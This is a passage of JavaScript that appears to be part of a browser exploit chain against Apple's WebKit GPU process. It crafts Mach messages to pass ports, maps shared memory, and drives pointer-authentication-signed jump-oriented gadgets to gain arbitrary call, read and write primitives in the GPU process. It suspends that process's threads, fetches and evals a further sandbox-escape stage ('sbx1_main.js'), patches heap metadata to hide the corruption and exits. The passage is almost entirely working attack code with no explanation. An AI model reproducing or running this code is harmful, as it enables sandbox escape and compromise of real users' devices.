      sendMessage(encoder, attachments = []) {
        const buffer = encoder.buffer();
        const numberOfPortDescriptors = attachments.length;
        let messageBodyIsOOL = false;
        let messageSize = MachMessage.messageSize(buffer.byteLength, numberOfPortDescriptors, messageBodyIsOOL);
        if (messageSize > inlineMessageMaxSize) {
          messageBodyIsOOL = true;
          messageSize = MachMessage.messageSize(0, numberOfPortDescriptors, messageBodyIsOOL);
        }
        const isComplex = numberOfPortDescriptors || messageBodyIsOOL;
        const message = new ArrayBuffer(messageSize);
        const view = new DataView(message);
        view.setUint32(0, isComplex ? 0x80000013 : 0x13, true);
        view.setUint32(4, messageSize, true);
        view.setUint32(8, Number(gpu_sendPort), true);
        view.setUint32(0x14, messageBodyIsOOL ? outOfLineBodyMessageID : inlineBodyMessageID, true);
        let messageOffset = 0x18;
        if (isComplex) {
          view.setUint32(messageOffset, numberOfPortDescriptors + messageBodyIsOOL, true);
          messageOffset += 4;
          for (const attachment of attachments) {
            view.setUint32(messageOffset, Number(attachment), true);
            view.setUint32(messageOffset + 4, MACH_MSG_PORT_DESCRIPTOR, true);
            view.setUint32(messageOffset + 8, MACH_MSG_TYPE_MOVE_SEND << 16, true);
            messageOffset += sizeof_mach_msg_port_descriptor_t;
          }
          if (messageBodyIsOOL) {
            view.setBigUint64(messageOffset, buffer.data(), true);
            view.setUint32(messageOffset + 8, 0x1000100, true);
            view.setUint32(messageOffset + 0xc, buffer.byteLength, true);
            messageOffset += sizeof_mach_msg_ool_descriptor_t;
          }
        }
        if (!messageBodyIsOOL) {
          const buffer_u8 = new Uint8Array(buffer);
          const message_u8 = new Uint8Array(message);
          for (let i = 0; i < buffer_u8.byteLength; ++i) {
            message_u8[messageOffset + i] = buffer_u8[i];
          }
        }
        const message_u8 = new Uint8Array(message);
        const message_ptr = allocate_gpu_memory(BigInt(message.byteLength));
        copy_to_gpu(message_ptr, message_u8);
        return gpu_slow_fcall(offsets.mach_msg_fn, message_ptr, 145n, BigInt(messageSize), 0n, 0n, 0n, 0n);
      }
      receiveMemoryPort() {
        let port;
        const kr = gpu_slow_fcall(offsets.mach_msg_fn, gpu_receiveBufferDataPointer, 0x906n, 0n, receiveBufferSizeAsBigInt, this.receivePort, 5000n, 0n);
        if (kr == KERN_SUCCESS) {
          const buffer = copy_from_gpu(gpu_receiveBufferDataPointer, 0x40n);
          const bufferU32 = new Uint32Array(buffer);
          port = BigInt(bufferU32[7]);
        } else if (kr == 0x10004003n) {
          ASSERT_NOT_REACHED("[!] mach_msg(): process not responding");
        } else {
          ASSERT_NOT_REACHED(`maybe gpu dead(code: ${kr.hex()})`);
        }
        ASSERT(port, "Could not receive port");
        return port;
      }
    }
    ;
    const remoteConnection = new GPURemoteConnection();
    remoteConnection.createReceivePort();
    let kr = remoteConnection.sendMessage(new Encoder(0x1337, 0n), [remoteConnection.receivePort]);
    ASSERT(!kr, "remoteConnection.sendMessage has been failed");
    const secondarySendPort = (() => {
      const decoder = gpuConnection.receiveMessage(0x1337);
      return decoder.attachments[0];
    })();
    const secondaryConnection = new Connection();
    secondaryConnection.setSendPort(secondarySendPort);
    secondaryConnection.createReceivePort();
    {
      const sizeBuffer = new BigUint64Array(2);
      sizeBuffer[0] = 0x88000n;
      const sizeBufferDataPointer = sizeBuffer.data();
      let fakeStackDataPointer = 0n;
      let memory = 0n;
      while (1) {
        let next_ptr = 0n;
        while (1) {
          const ab = new ArrayBuffer(0x6000);
          next_ptr = ab.data() + 0x6000n;
          if (next_ptr == (next_ptr & ~0x3fffn)) {
            break;
          }
        }
        memory = new ArrayBuffer(0x88000);
        fakeStackDataPointer = memory.data();
        if (fakeStackDataPointer == (fakeStackDataPointer & ~0x3fffn)) break;
        LOG(`fakeStack not aligned:${fakeStackDataPointer.hex()}, continue searching`);
      }
      ASSERT(fakeStackDataPointer == (fakeStackDataPointer & ~0x3fffn), "fakeStack is not page aligned");
      kr = fcall(offsets.mach_make_memory_entry_64_fn, __mach_task_self, sizeBufferDataPointer, fakeStackDataPointer, 3n, sizeBufferDataPointer + 8n, 0n);
      ASSERT(!kr, "mach_make_memory_entry_64 has failed");
      const memPort = sizeBuffer[1];
      LOG(`memPort: ${memPort.hex()} `);
      kr = secondaryConnection.sendMessage(new Encoder(0x1338, 0n), [memPort]);
      ASSERT(!kr, "secondaryConnection.sendMessage has failed");
      const gpu_memPort = remoteConnection.receiveMemoryPort();
      LOG(`gpu_memPort: ${gpu_memPort.hex()} `);
      const VM_FLAGS_ANYWHERE = 1n;
      const VM_INHERIT_NONE = 2n;
      gpu_slow_write64(gpu_receiveBufferDataPointer, 0n);
      LOG('going to mach_vm_map');
      LOG(`gpu_receiveBufferDataPointer: ${gpu_receiveBufferDataPointer.hex()}`);
      kr = gpu_slow_fcall(offsets.mach_vm_map_fn, __mach_task_self, gpu_receiveBufferDataPointer, 0x88000n, 0n, VM_FLAGS_ANYWHERE, gpu_memPort, 0n, 0n, (3n << 32n) + 3n, VM_INHERIT_NONE);
      ASSERT(!kr, "mach_vm_map has failed");
      const gpu_memory = gpu_slow_read64(gpu_receiveBufferDataPointer);
      LOG(`gpu_memory: ${gpu_memory.hex()} `);
      const x0_off = 0;
      const x19_off = x0_off + 0x20;
      const x20_off = x19_off + 0x410;
      const x22_off = x20_off + 0x30;
      const scratchpad_off = x22_off + 0x20;
      const fast_x0 = gpu_memory + BigInt(x0_off);
      const fast_x19 = gpu_memory + BigInt(x19_off);
      const fast_x20 = gpu_memory + BigInt(x20_off);
      const fast_scratchpad = gpu_memory + BigInt(scratchpad_off);
      const gpu_stack = gpu_memory;
      const x0_u64 = new BigUint64Array(memory, x0_off);
      const x19_f64 = new Float64Array(memory, x19_off);
      const x19_u64 = new BigUint64Array(memory, x19_off);
      const x20_u64 = new BigUint64Array(memory, x20_off);
      const fast_scratchpad_u64 = new BigUint64Array(memory, scratchpad_off);
      const fast_scratchpad_u8 = new Uint8Array(memory, scratchpad_off);
      const stack_u64 = new BigUint64Array(memory);
      const wp_fast_scratchpad = fast_scratchpad_u64.data();
      x0_u64[1] = paciza_gadget_loop_3;
      const pacib_gadget_loop_1_0x80020 = gpu_slow_pacib(gadget_loop_1, gpu_stack + 0x80020n);
      const pacib_gadget_loop_1_0x800c0 = gpu_slow_pacib(gadget_loop_1, gpu_stack + 0x800c0n);
      const pacib_gadget_loop_2_0x80010 = gpu_slow_pacib(gadget_loop_2, gpu_stack + 0x80010n);
      const pacib_gadget_loop_2_0x800b0 = gpu_slow_pacib(gadget_loop_2, gpu_stack + 0x800b0n);
      gpu_slow_write64(jop_stack_top + 0x800c0n, 0x29n);
      gpu_slow_write64(jop_stack_top + 0x800c8n, gpu_slow_pacib(gadget_loop_3, jop_stack_top + 0x800d0n));
      gpu_slow_write64(x20 + 0x20n, fast_x0);
      gpu_slow_write64(x19, paciza_gadget_control_3);
      gpu_slow_write64(jop_stack_top + 0x80160n, gpu_stack + 0x80000n);
      gpu_slow_write64(jop_stack_top + 0x80168n, gpu_slow_pacib(gadget_loop_1, jop_stack_top + 0x80170n));
      gpu_slow_write64(jop_stack_top + 0x80150n, fast_x20);
      gpu_slow_write64(jop_stack_top + 0x80158n, fast_x19);
      const MAGIC = 1.1;
      x19_f64[0x20 / 8] = MAGIC;
      x19_u64[0 / 8] = paciza_gadget_loop_1;
      x0_u64[8 / 8] = paciza_gadget_control_1;
      while (x19_f64[0x20 / 8] == MAGIC);
      stack_u64[0x80008 / 8] = pacib_gadget_loop_2_0x80010;
      x19_f64[8 / 8] = MAGIC;
      x20_u64[0x10 / 8] = paciza_gadget_loop_2;
      x19_u64[0 / 8] = paciza_gadget_control_2;
      while (x19_f64[8 / 8] == MAGIC);
      x20_u64[0x20 / 8] = paciza_malloc;
      x20_u64[0x28 / 8] = 0n;
      stack_u64[0x80018 / 8] = pacib_gadget_loop_1_0x80020;
      x19_f64[0x20 / 8] = MAGIC;
      x19_u64[0 / 8] = paciza_gadget_loop_1;
      x20_u64[0x10 / 8] = paciza_gadget_control_3;
      while (x19_f64[0x20 / 8] === MAGIC);
      stack_u64[0x800a8 / 8] = pacib_gadget_loop_2_0x800b0;
      x19_f64[8 / 8] = MAGIC;
      x20_u64[0x10 / 8] = paciza_gadget_loop_2;
      x19_u64[0 / 8] = paciza_gadget_set_all_registers;
      while (x19_f64[8 / 8] === MAGIC);
      stack_u64[0x800b0 / 8] = gpu_stack + 0x80000n;
      stack_u64[0x800b8 / 8] = pacib_gadget_loop_1_0x800c0;
      x19_f64[0x20 / 8] = MAGIC;
      x19_u64[0 / 8] = paciza_gadget_loop_1;
      x20_u64[0x10 / 8] = paciza_gadget_control_3_4;
      while (x19_f64[0x20 / 8] === MAGIC);
      function gpu_pacia0(ptr, ctx) {
        gpu_slow_write64(signPointerSelf, 0x80010000_00000000n | ctx >> 48n << 32n);
        return gpu_fcall(signPointer, signPointerSelf, ctx, ptr);
      }
      function gpu_fcall(pc, ...args) {
        if (!cache.has(pc)) {
          cache.set(pc, gpu_pacia(pc.noPAC(), 0n));
        }
        const signed_pc = cache.get(pc);
        stack_u64[0x80008 / 8] = pacib_gadget_loop_2_0x80010;
        x19_f64[8 / 8] = MAGIC;
        x20_u64[0x10 / 8] = paciza_gadget_loop_2;
        performance.now();
        x19_u64[0 / 8] = paciza_gadget_control_2;
        while (x19_f64[8 / 8] === MAGIC);
        x20_u64[0x20 / 8] = signed_pc;
        x20_u64[0x28 / 8] = 0n;
        stack_u64[0x80018 / 8] = pacib_gadget_loop_1_0x80020;
        x19_f64[0x20 / 8] = MAGIC;
        x19_u64[0 / 8] = paciza_gadget_loop_1;
        performance.now();
        x20_u64[0x10 / 8] = paciza_gadget_control_3;
        while (x19_f64[0x20 / 8] === MAGIC);
        for (let i = 0; i < args.length && i < 8; ++i) {
          stack_u64[0x80098 / 8 - i] = args[i];
        }
        for (let i = 8; i < args.length; ++i) {
          stack_u64[0x80070 / 8 + i] = args[i];
        }
        stack_u64[0x800a8 / 8] = pacib_gadget_loop_2_0x800b0;
        x19_f64[8 / 8] = MAGIC;
        x20_u64[0x10 / 8] = paciza_gadget_loop_2;
        performance.now();
        x19_u64[0 / 8] = paciza_gadget_set_all_registers;
        while (x19_f64[8 / 8] === MAGIC);
        stack_u64[0x800b0 / 8] = gpu_stack + 0x80000n;
        stack_u64[0x800b8 / 8] = pacib_gadget_loop_1_0x800c0;
        x19_f64[0x20 / 8] = MAGIC;
        x19_u64[0 / 8] = paciza_gadget_loop_1;
        performance.now();
        x20_u64[0x10 / 8] = paciza_gadget_control_3_4;
        while (x19_f64[0x20 / 8] === MAGIC);
        return x19_u64[0x20 / 8];
      }
      cache.set(offsets.memcpy, gpu_pacia0(offsets.memcpy, 0n));
      function gpu_read64(addr) {
        gpu_fcall(offsets.memcpy, fast_scratchpad, addr, 8n);
        return fast_scratchpad_u64[0];
      }
      function gpu_write64(addr, value) {
        fast_scratchpad_u64[0] = value;
        gpu_fcall(offsets.memcpy, addr, fast_scratchpad, 8n);
      }
      function gpu_pacia(ptr, ctx) {
        gpu_write64(signPointerSelf, 0x80010000_00000000n | ctx >> 48n << 32n);
        return gpu_fcall(signPointer, signPointerSelf, ctx, ptr);
      }
      function gpu_pacib(ptr, ctx) {
        gpu_write64(signPointerSelf, 0x80030000_00000000n | ctx >> 48n << 32n);
        return gpu_fcall(signPointer, signPointerSelf, ctx, ptr);
      }
      cache.set(offsets.malloc, gpu_pacia(offsets.malloc, 0n));
      function gpu_fcall_close() {
        x19_u64[0 / 8] = gpu_pacia(offsets.pthread_exit, 0n);
      }
      function gpu_copy_buffer(ptr, size) {
        const chunk = gpu_fcall(offsets.malloc, size);
        let dst = chunk;
        while (size > 0n) {
          let cp_sz = size;
          if (cp_sz > 0x40000n) {
            cp_sz = 0x40000n;
          }
          fcall(offsets.memcpy, wp_fast_scratchpad, ptr, cp_sz);
          gpu_fcall(offsets.memcpy, dst, fast_scratchpad, cp_sz);
          size -= cp_sz;
          dst += cp_sz;
          ptr += cp_sz;
        }
        return chunk;
      }
      function gpu_fcall_enable_sleep() {}
      function gpu_fcall_disable_sleep() {}
      LOG(`going to suspend the spinners in the GPU`);
      const backend2_thread_port = gpu_read64(backend2_processingThread + 0x34n) & 0xffffffffn;
      LOG(`backend2_thread_port: ${backend2_thread_port.hex()}`);
      const backend3_thread_port = gpu_read64(backend3_processingThread + 0x34n) & 0xffffffffn;
      LOG(`backend3_thread_port: ${backend3_thread_port.hex()}`);
      LOG(`gpu scratchpad: ${fast_scratchpad.hex()}`);
      LOG(`wc scratchpad: ${fast_scratchpad_u8.data().hex()}`);
      gpu_fcall(offsets.libsystem_kernel__thread_suspend, backend2_thread_port);
      gpu_fcall(offsets.libsystem_kernel__thread_suspend, backend3_thread_port);
      const gpu_dlsym_buffer = gpu_fcall(offsets.malloc, 0x80n);
      function gpu_dlsym(handle, symbol) {
        const aligned_size = symbol.length + 8 & ~7;
        const buffer = new ArrayBuffer(aligned_size);
        const u8 = new Uint8Array(buffer);
        const u64 = new BigUint64Array(buffer);
        for (let i = 0; i < symbol.length; ++i) {
          u8[i] = symbol.charCodeAt(i);
        }
        for (let i = 0; i < u64.length; ++i) {
          fast_scratchpad_u64[i] = u64[i];
        }
        gpu_fcall(offsets.memcpy, gpu_dlsym_buffer, fast_scratchpad, BigInt(aligned_size));
        return gpu_fcall(offsets.libdyld__dlsym, handle, gpu_dlsym_buffer);
      }
      for (let i = 0; i < renderingBackendConnections.length; ++i) {
        const renderingBackendConnection = renderingBackendConnections[i];
        while (renderingBackendConnection.tryConsumeMessage());
      }
      while (firstGpuConnection.tryConsumeMessage());
      while (gpuConnection.tryConsumeMessage());
      const sbx0_pac_end = Date.now();
      log(`[profiler] sbx0 (pac) took ${sbx0_pac_end - sbx0_pac_begin} ms`);
      LOG(`[+] SBX0 complete`);
      try {
        const gpuRead64 = gpu_read64;
        const gpuWrite64 = gpu_write64;
        const gpuFcall = gpu_fcall;
        const gpuDlsym = gpu_dlsym;
        const gpuPaciza = function (ptr) {
          return gpu_pacia(ptr, 0n);
        };
        const gpuPacia = gpu_pacia;
        const gpuPacib = gpu_pacib;
        const gpuCopyBuffer = gpu_copy_buffer;
        const gpuFcallEnableSleep = gpu_fcall_enable_sleep;
        const gpuFcallDisableSleep = gpu_fcall_disable_sleep;
        const addrof = p.addrof;
        const sc_slide = p.slide;
        const sbx1_script = getJS('/sbx1_main.js');
        eval(sbx1_script);
        LOG('Restore bmalloc metadata after emptyString Corruption');
        gpu_write64(offsets.emptyString + 0x68n, 0x300000005n);
        gpu_write64(offsets.emptyString + 0x70n, 0x100000080n);
        gpu_write64(offsets.emptyString + 0x78n, 0n);
        gpu_write64(offsets.emptyString + 0x80n, 0x1200000001n);
        sbx1_end = Date.now();
        log(`[profiler] sbx1 took ${sbx1_end - sbx0_pac_end} ms`);
        LOG(`[+] SBX1 complete`);
        LOG('Invalidate backend connection from gpu process side');
        const remoteRenderingBackendMap = gpu_read64(myWebProcessConnection + 0xe8n);
        LOG(`remoteRenderingBackendMap: ${remoteRenderingBackendMap.hex()} `);
        const remoteGraphicsContextGLMap = gpu_read64(myWebProcessConnection + 0xf0n);
        LOG(`remoteGraphicsContextGLMap: ${remoteGraphicsContextGLMap.hex()} `);
        gpu_write64(myWebProcessConnection + 0xe8n, 0n);
        gpu_write64(myWebProcessConnection + 0xf0n, 0n);
        LOG('Invalidated');
        LOG("Calling _exit()");
        fcall(offsets.exit, 0n);
        gpu_fcall_close();
      } catch (e) {
        LOG(`${e} `);
        LOG(btoa(e));
      }
    }
  })();
})();
